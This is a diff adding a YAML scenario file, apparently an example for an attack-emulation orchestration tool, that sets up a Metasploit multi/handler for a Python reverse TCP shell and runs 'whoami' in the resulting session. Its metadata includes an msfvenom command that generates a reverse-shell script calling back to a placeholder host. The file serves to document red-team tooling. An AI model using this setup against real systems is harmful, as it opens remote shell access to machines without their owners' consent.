@@ -1,0 +1,24 @@
+# TODO: remove output sharing and create a separate scenario that shows the output sharing from stage
+---
+name: Metasploit trigger example
+metadata:
+  description: This example shows how to use the Metasploit trigger.
+stages:
+  do-stuff-on-worker:
+    metadata:
+      description: This stage will start once the r_shell.py is executed!
+      generate_reverse_shell_code: msfvenom -p python/shell_reverse_tcp lhost=<Metasploit host's address> lport=4444 > r_shell.py
+    type: metasploit
+    arguments:
+      module_name: multi/handler
+      datastore:
+        PAYLOAD: python/shell_reverse_tcp
+        LHOST: 0.0.0.0
+        LPORT: 4444
+    steps:
+      execute-in-session:
+        is_init: true
+        module: command
+        arguments:
+          session_id: $do-stuff-on-worker.session_id
+          command: whoami
